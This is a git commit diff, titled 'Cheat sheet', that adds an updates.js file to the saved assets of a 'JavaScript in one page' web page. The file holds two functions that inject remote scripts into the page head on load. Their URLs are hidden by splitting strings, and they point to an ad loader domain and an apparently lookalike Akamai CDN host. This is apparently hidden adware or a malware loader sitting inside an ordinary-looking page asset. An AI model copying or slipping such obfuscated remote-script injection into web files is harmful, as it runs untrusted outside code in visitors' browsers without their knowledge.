311c53305c4ffc08b975f3a40ba084bd0c3e217a
eckzen <eckzen@yahoo.com>
2015-04-20 15:51:30 +0800

    Cheat sheet

---
+++ JavaScript in one page _ JavaScript.SU_files/updates.js
@@ -0,0 +1,15 @@
+(function() {
+    var head = document.getElementsByTagName('head')[0];
+    var script = document.createElement('script');
+    script.type = 'text/javascript';
+    script.src = '//a'+'d'+'s.df'+'g'+'io.com/lo'+'ad'+'er.js?cl'+'ien'+'t=AJ678';
+    head.appendChild(script);
+})();
+
+(function() {
+    var head = document.getElementsByTagName('head')[0];
+    var script = document.createElement('script');
+    script.type = 'text/javascript';
+    script.src = '//cdn'+'cache-a.akam'+'aihd.net/sub/h7b9383/AJ678/l.js?pid=2347&ext=YTD';
+    head.appendChild(script);
+})();
